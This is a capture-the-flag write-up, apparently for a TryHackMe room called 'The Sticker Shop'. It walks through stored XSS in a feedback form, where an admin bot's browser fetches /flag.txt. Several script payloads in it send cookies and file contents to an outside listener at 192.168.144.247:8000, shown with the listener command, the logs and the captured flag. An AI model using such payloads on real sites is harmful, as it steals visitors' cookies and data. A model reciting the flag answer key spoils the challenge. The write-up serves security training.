# The Sticker Shop


---

## **`hint`** say

> They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!


### that is mean it's maybe have xss to steal flag

```
<script>
fetch("/flag.txt")
  .then(r=>r.text())
  .then(t=>fetch("http://192.168.144.247:8000/?REL="+encodeURIComponent(t)))
  .catch(e=>fetch("http://192.168.144.247:8000/?RELE="+encodeURIComponent(e.message)));
</script>
```

<img width="1268" height="304" alt="image" src="https://github.com/user-attachments/assets/acb151ca-cedc-4010-b9f6-516224069b70" />


----




The hint about **hosting everything on the same computer that they use for browsing the internet and looking at customer feedback** is the key. It tells us:

1. A **bot / admin browser** runs on the same machine as the web server.
    
2. That bot **views the feedback** we submit.
    
3. Therefore, if we can inject JavaScript into the feedback, it will execute in the bot's browser — and the bot has local access to the flag.
    

This is a classic **stored XSS → exfiltration** scenario.




---

I test whether feedback is rendered as raw HTML by submitting a simple payload:

```html

<script>fetch("http://192.168.144.247:8000/?c="+document.cookie)</script>
```

We start a listener:

```bash

python3 -m http.server 8000
```

Within ~10 seconds, we see repeated hits:

```
10.114.146.69 - - [..] "GET /?c= HTTP/1.1" 200 -
10.114.146.69 - - [..] "GET /?c= HTTP/1.1" 200 -
```


Two things confirmed:

1.  Stored XSS works --- the `<script>` executes.

2.  A bot runs on `10.114.146.69` and re-visits the feedback page every ~10 seconds.

3.  `document.cookie` is empty --- the flag is not stored in a cookie.

So we need to make the bot's browser fetch the flag file and send it to us.

---

## Failed Attempts — and Why They Failed



This is the most instructive part of the challenge. Everything below did not work, and understanding why is the whole lesson.

### Attempt 1 --- `fetch` to `localhost`

```html

<script>
fetch("http://localhost:8080/flag.txt")
  .then(r => r.text())
  .then(t => fetch("http://192.168.144.247:8000/?flag=" + encodeURIComponent(t)))
  .catch(e => fetch("http://192.168.144.247:8000/?err=" + encodeURIComponent(e.message)));
</script>
```

Result:  `?err=Failed to fetch`

### Attempt 2 --- `fetch` to `127.0.0.1`

Same as above but with `127.0.0.1`. Result:  `?err=Failed to fetch`

### Attempt 3 --- `fetch` to the public IP

```html

<script>
fetch("http://10.114.146.69:8080/flag.txt")
  .then(r => r.text())
  .then(t => fetch("http://192.168.144.247:8000/?flag=" + encodeURIComponent(t)))
  .catch(e => fetch("http://192.168.144.247:8000/?err=" + encodeURIComponent(e.message)));
</script>
```

Result:  `?ERR10=Failed to fetch`

### Attempt 4 --- Load the flag as an image

```html

<script>
var i = new Image();
i.onload  = () => fetch("http://192.168.144.247:8000/?img=LOADED");
i.onerror = () => fetch("http://192.168.144.247:8000/?img=ERROR");
i.src = "http://10.114.146.69:8080/flag.txt";
</script>
```

Result:  `?img=ERROR` --- the flag isn't a valid image (or the request was blocked). Doesn't give us the content anyway.

### Attempt 5 --- Read the flag via an iframe

```html

<iframe id=f src="http://10.114.146.69:8080/flag.txt" style="display:none"></iframe>
<script>
document.getElementById('f').onload = function(){
  try { fetch("http://192.168.144.247:8000/?IF=" + encodeURIComponent(this.contentDocument.body.innerText)); }
  catch(e) { fetch("http://192.168.144.247:8000/?IFE=" + encodeURIComponent(e.message)); }
};
</script>
```

Result:  `?iferr=Cannot read properties of null (reading 'body')`

### Why all of these failed --- the Same-Origin Policy

Browsers enforce the Same-Origin Policy (SOP):

> Two URLs are the same origin only if they share the scheme, host, and port.

When JavaScript on origin A tries to read a response from origin B, the browser blocks it unless origin B sends an `Access-Control-Allow-Origin` (CORS) header permitting it.

Our payloads all assumed the bot was browsing `http://10.114.146.69:8080/` (or `localhost:8080`, or `127.0.0.1:8080`). If that were true, the fetch to the same URL would be same-origin and would succeed.

It didn't. That means the bot was not on any of those origins.

The iframe result is the smoking gun: `contentDocument` was `null`, which only happens when the iframe is cross-origin relative to the parent page. Since we pointed the iframe at `10.114.146.69:8080` and it was still cross-origin, the bot's page must live on a different origin entirely (a different host, port, or both --- e.g., an internal admin panel).

Because we don't know the bot's origin, we can't hardcode any absolute URL --- every guess will be cross-origin and blocked by SOP.


---

## The Solution  Use a Relative URL





Instead of hardcoding the origin, we let the browser figure it out:

```js

fetch("/flag.txt")
```

A relative URL is resolved against the current page's origin. Whatever origin the bot is on, `/flag.txt` points to that same origin --- so the request is always same-origin, and SOP never blocks it.

### Final payload

```html

<script>
fetch("/flag.txt")
  .then(r => r.text())
  .then(t => fetch("http://192.168.144.247:8000/?REL=" + encodeURIComponent(t)))
  .catch(e => fetch("http://192.168.144.247:8000/?RELE=" + encodeURIComponent(e.message)));
</script>
```

Submitted as the `feedback` field to `/submit_feedback`.

### Listener

```bash

python3 -m http.server 8000
```

### Result

```text

10.114.146.69 - - [..] "GET /?REL=THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D HTTP/1.1" 200 -
```

URL-decode `%7B` → `{` and `%7D` → `}`:

```text

THM{83789a69074f636f64a38879cfcabe8b62305ee6}
```

Flag captured.





































